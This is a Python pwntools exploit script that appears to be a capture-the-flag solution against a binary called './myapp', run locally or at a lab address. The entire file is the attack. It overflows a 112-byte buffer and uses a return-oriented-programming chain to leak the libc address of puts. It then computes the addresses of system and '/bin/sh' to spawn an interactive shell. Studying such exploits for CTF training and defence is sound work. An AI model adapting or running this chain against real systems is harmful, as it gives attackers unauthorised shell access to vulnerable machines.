from pwn import *
import struct
import re
import sys

BINARY = './myapp'

IP = "10.10.10.147"
PORT = 1337

LOCAL = True
PRINT = False

########################################################################
# https://ctf101.org/binary-exploitation/return-oriented-programming/  #
########################################################################

## PLAN ##
#   GARBAGE UP TO STORED EIP (114) [112 Buffer + Base Pointer]
#   G1 [pop rdi; ret]
#       Gadget Address 
#       Argument (libc "/bin/sh")
#   G2 [pop rsi; pop r15; ret]
#       Gadget Address 
#       Argument rsi (exit address)
#       Argument r15 (Garbage)
#       System address

# =========================== VARIABLES ======================================
# Length of the vuln buffer
BUFFER_LEN = 112 + 8# 112 + BASE POINTER

BUFFER = b"A" * BUFFER_LEN
# ===========================================================================

def READ():
    try:
        lines = io.recvlines(timeout=1)

        for l in lines:
            sys.stdout.buffer.write(l)
            print()

        return lines
    except EOFError:
        print("[!] End Of File")
        io.close()
        exit()

def PAYLOAD(data):
    io.send(payload)
    io.send("\n")

if not PRINT:
    if LOCAL:
        context.terminal = "bash"
        context.binary = BINARY
        io = process(BINARY)

    else:
        io = remote(IP, PORT)

if PRINT:
    sys.stdout.buffer.write(payload)
else:

    # # ROUND 1
    g1      = p64(0x40120b) # pop rdi ; ret
    got_put = p64(0x404018)
    plt_put = p64(0x401030)
    main    = p64(0x40115f)

    payload = BUFFER
    payload += g1
    payload += got_put
    payload += plt_put
    payload += main

    log.success("## Starting the first chain ##")
    READ()
    PAYLOAD(payload)
    io.recvline()

    leaked_puts = io.recvline().strip().ljust(8, b'\x00')
    log.success("Leaked puts@LIBC -- " + str(leaked_puts))

    # ROUND 2
    log.success("## Starting the second chain ##")
    libc_system = 0x047850
    libc_puts   = 0x074ab0
    libc_sh     = 0x186cee

    leaked_puts = u64(leaked_puts)
    offset = leaked_puts - libc_puts
    sys = p64(offset + libc_system)
    sh = p64(offset + libc_sh)

    payload = BUFFER
    payload += g1
    payload += sh
    payload += sys

    print(io.recvline())
    PAYLOAD(payload)
    io.interactive()